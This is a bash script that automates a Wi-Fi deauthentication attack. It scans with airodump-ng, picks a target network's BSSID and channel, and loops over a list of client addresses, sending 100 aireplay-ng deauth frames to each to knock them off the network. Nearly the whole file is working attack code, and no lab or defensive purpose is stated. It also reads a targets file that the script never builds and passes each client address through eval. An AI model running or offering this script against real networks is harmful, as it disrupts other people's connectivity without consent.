#! /bin/bash

WLAN="wlan0"
while getopts "::h:i:t:" opt; do
	case $opt in 
		h)
			cat manual.txt
			exit
			;;
		i) 
			WLAN=$OPTARG
			;;
		t) 
			TARGET=$OPTARG
			;;
	esac
done
echo "Interface set as: $WLAN"
echo "Target wifi set as: $TARGET"

#Clear previous runs
#rm -rf /runfiles/
rm -f runfiles/initscan-01.csv

Counter=0

#Log initial BSSIDs
mkdir -p runfiles
gnome-terminal -e "bash -c \"airodump-ng -w runfiles/initscan --output-format csv $WLAN; exec bash\""
sleep 15
kill $(ps aux | grep 'airodump-ng' | awk '{print $2}')> /dev/null

#Search BSSIDs for target
MATCHING_LINES=$(grep $TARGET runfiles/initscan-01.csv)
echo "###DEBUG###"
echo "$MATCHING_LINES"
echo "###DEBUG###"

echo $1 $MATCHING_LINES
echo $2 $MATCHING_LINES

if [ $(grep $TARGET runfiles/initscan-01.csv | wc -l) -gt 1 ]; then
	echo "ERROR: More than 1 match. Please refine search criteria."
	exit
else
	echo "Correct amount of matches."
fi

TARGET_BSSID=$(head -n 1 runfiles/targets.txt)
echo "$TARGET_BSSID"
TARGET_CHANNEL=$(head -n 2 runfiles/targets.txt | tail -1)
echo "$TARGET_CHANNEL"

#Log targets off BSSID
#mkdir -p runfiles
#gnome-terminal -e "bash -c \"airodump-ng -c $TARGET_CHANNEL --bssid $TARGET_BSSID -w runfiles/initscan --output-format csv $WLAN; exec bash\""
#sleep 15
#kill $(ps aux | grep 'airodump-ng' | awk '{print $2}')> /dev/null

#Open new terminal to capture channel. 
gnome-terminal -e "bash -c \"airodump-ng -c $TARGET_CHANNEL --bssid $TARGET_BSSID $WLAN; exec bash\""
#gnome-terminal -e `airodump-ng -c $TARGET_CHANNEL --bssid $TARGET_BSSID wlan0`

sleep 1

#Loop through text file and deauth all targets
while read line; do
	#Ignore first two lines; already took care of them above
	if [ $Counter -eq 0 ]; then
		echo "######### TARGET BSSID: $line #########"
		Counter=`expr $Counter + 1`
	elif [ $Counter -eq 1 ]; then
		echo "######### Channel: $line ##############################"
		Counter=`expr $Counter + 1`
	else
		echo "KICKING: $line off of $TARGET_BSSID"
		eval aireplay-ng -a $TARGET_BSSID --deauth 100 -c $line $WLAN
	fi
done < runfiles/targets.txt
gnome-terminal -e -x bash -c ""

#aireplay-ng --deauth 100 -a [SSID] -c [client] [wifi]
